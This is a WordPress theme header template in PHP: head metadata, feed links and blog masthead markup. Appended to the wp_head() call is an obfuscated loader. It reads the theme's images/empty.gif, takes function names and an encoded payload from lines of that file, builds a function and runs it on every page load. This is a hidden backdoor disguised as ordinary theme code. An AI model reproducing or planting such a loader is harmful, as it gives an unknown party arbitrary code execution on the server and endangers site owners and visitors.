<?php /* Don't remove this line. */ require(ABSPATH . 'wp-blog-header.php'); ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head profile="http://gmpg.org/xfn/11">
  <title><?php bloginfo('name'); ?><?php wp_title(); ?></title>
  <meta http-equiv="Content-Type" content="text/html; charset=<?php bloginfo('charset'); ?>" />
  <meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats please -->
  <script src="<?php bloginfo('template_directory'); ?>/js_quicktags-mini.js" type="text/javascript"></script>
  <style type="text/css" media="screen">
   @import url( <?php bloginfo('stylesheet_url'); ?> );
  </style>
  <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
  <link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
  <link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
  <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
  <?php wp_get_archives('type=monthly&format=link'); ?>
  <?php //comments_popup_script(); // off by default ?>
  <?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
 </head>
 <body>
<div>
<div id="rap">
 <div class="clearer"></div>
  <a name = "top"></a>
 <div id="masthead">
<div id="blogmenu"><ul>
<?php wp_list_pages('title_li=0&depth=1'); ?>
</ul></div>
  <div id="blogtitle">
    <a href="<?php echo get_settings('home'); ?>"><?php bloginfo('name'); ?></a>
  </div>
    <div id="blogdesc"><?php bloginfo('description'); ?></div>
    
</div>
  